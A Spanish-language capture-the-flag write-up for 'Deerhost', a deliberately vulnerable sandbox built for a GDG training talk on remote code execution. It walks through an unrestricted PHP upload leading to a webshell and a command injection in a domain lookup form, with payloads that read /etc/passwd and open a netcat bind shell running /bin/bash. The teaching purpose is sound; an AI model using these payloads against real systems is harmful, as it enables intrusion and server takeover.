---
title: "[Write-up] Deerhost"
subtitle: "Paso a paso para resolver esta maquina"
date: 2020-08-02T19:48:20-03:00
lastmod: 2020-08-02T19:48:20-03:00
draft: false
author: "memoryempty"
authorLink: ""
description: ""

tags: ["write-up"]
categories: []

hiddenFromHomePage: false
hiddenFromSearch: false

featuredImage: "images/deerhost/deerhost_main_photo.jpg"
featuredImagePreview: ""

toc:
  enable: true
math:
  enable: false
lightgallery: false
license: ""
---


# Ficha técnica

> **Nombre**: Deerhost

> **Creadores**: Matías Ramirez & MemoryEmpty

> **Nivel**: Muy fácil

## Introducción a Deerhost

Deerhost es una sandbox que desarrollamos para que los asistentes al encuentro de GDG Training puedan poner en práctica las técnicas de RCE expuestas en el encuentro **"RCE hasta la cocina en GDG"**. Este *paso a paso* tiene como fín servir de material de  consulta para repasar lo aprendido. Les recomiendo tener a mano las diapositivas de la exposición desarrolladas por Matías, que es un material de consulta muy claro en el impacto que estas vulnerabilidades pueden llegar a alcanzar en entornos reales.

## Enumeración

Nuestra primera tarea a la hora de auditar -o de hackear- siempre es reconocer los posibles vectores de ataque. En este caso, con solamente navegar por el sitio podrán encontrar dos vulnerabilidades sencillas de explotación. 

## 1. Tomando el control con nuestros CV's

Apenas abrimos deerhost veremos un par de links en el encabezado. Si nos dirigimos a la página de **"work with us" (/cv.php)** nos encontramos con un formulario para subir nuestro CV a la empresa.

![foto_exploit_1](images/deerhost/deerhost_exploit_1_a.jpg)

 Naturalmente, nos preguntamos, ¿Qué clase de cuidado han tenido los desarrolladores del sitio para prevenir que en lugar de un CV, alguien suba algún maliciosos? Para averiguarlo, podemos preparar una simple prueba:

```
	<?php phpinfo(); ?>
```

> nota: phpinfo() es una función de php para consultar la version y otros datos del servicio instalado. Cuando al subir un archivo con esta función obtenemos el la ejecución del mismo, es probable que podamos ejecutar otros comando.

Al subirla vemos que la respuesta del sitio delata que el archivo ha sido guardado. Si logramos dar con su paradero,  **en /uploads/<nombre_del_archivo.php>** podemos ver que nuestro prueba funciona perfectamente.

![foto_exploit_2](images/deerhost/deerhost_exploit_1_b.jpg)

Ahora podemos mejorar nuestro payload: En lugar de ejecutar dicho comando, podemos ejecutar una webshell corra en php. Pueden hacer la prueba con cualquiera de [esta lista](https://github.com/xl7dev/WebShell/tree/master/Php).


## 2. Busqueda de dominios, un tanto especial

En la pagina principal podemos consultar por un dominio y ver si esta disponible para contratarlo. No hay nada raro en ello, sin embargo, al hacer una simple consulta - como puede ser ingresando **google.com** - el output del sitio nos resulta algo peculiar.

![foto_exploit_2](images/deerhost/deerhost_exploit_2_a.jpg)

![foto_exploit_2](images/deerhost/deerhost_exploit_2_b.jpg)
> ¿Qué es nslookup? Es un comando de linux para obtener informacion de un dominio (concretamente, del DNS). su uso es sencillo, basta con poner 'nslookup google.com' para obtener los datos.


Hay buenas razonas para pensar que este buscador esta ejecutando nslookup con los parámetros que le hemos indicado. ¿Será acaso posible correr más de un comando? ¡Vamos a averiguarlo!, para ello, imaginamos que, como en cualquier linea de terminal en linux, es posible ejecutar más de un solo comando. Para confirmar nuestra teoría podremos escribir un payload parecido al siguiente: (*¿Quizás a esta altura deberíamos ofrecernos como diseñadores creativos de naming?*)

`asdqweasdqe.com; cat /etc/passwd`

Lo que estamos haciendo se parece a decirle al sitio *"hey! quiero revisar este dominio (cualquiera), y luego ejecuta el comando `cat` al archivo de `/etc/passwd`"*. Como vemos, nuestra prueba funciona y ya sabemos también algunas cosas más del servidor.

![foto_exploit_2](images/deerhost/deerhost_exploit_2_c.jpg)

Una vez que hayamos descubierta una vulnerabilidad como esta, ya podemos correr todo tipo de comandos. Por ejemplo, como en el caso del payload anterior, podemos intentar conseguir una shell. En este caso lo que haremos será correr netcat del lado del servidor, esperando una conexión remota:

`bhf.com.ar; nc -lp 4444 -e /bin/bash`

los flags de netcat usados aquí son:

	--listen 	para dejar en modo escucha el puerto.
	--port 4444	indica el puerto por el cual nos conectaremos.
	--execute	indica al servidor que corra un programa, en este caso
				/bin/bash, una vez que se establezca la conexión.

Cuando hacemos nuestra consulta, vemos que el la pagina queda indefinidamente en pausa, ese es un signo bastante bueno cuando ejecutamos payloads que dejan servicios corriendo del lado del servidor.

¡Ahora debemos conectarnos! para ello, usamos netcat nuevamente, desde nuestra propia terminal:

`nc gdg-ctf.hostear.com.ar -v 4444`

Podemos usar la ip o el dominio. Por otro lado hemos activado el flag `--verbose` para obtener más información. Con ello, ya tendremos acceso al servidor.
	
## Notas finales

Aunque deerhost presente a simple vista un escenario muy sencillo y puede vulnerarse con facilidad, su riqueza esta en ser más realista de lo que uno se imagina. Para quienes recién comienzan a tomar conciencia de la importancia de la ciberseguridad puede ser muy útil hacer las pruebas localmente, y por supuesto ver que más pueden encontrar. El repositorio de github se encuentra abierto a todos aquellos que quieran probarlo [gdg-rce-ctf](https://github.com/duality084/gdg-rce-ctf)

**Happy Hacking!**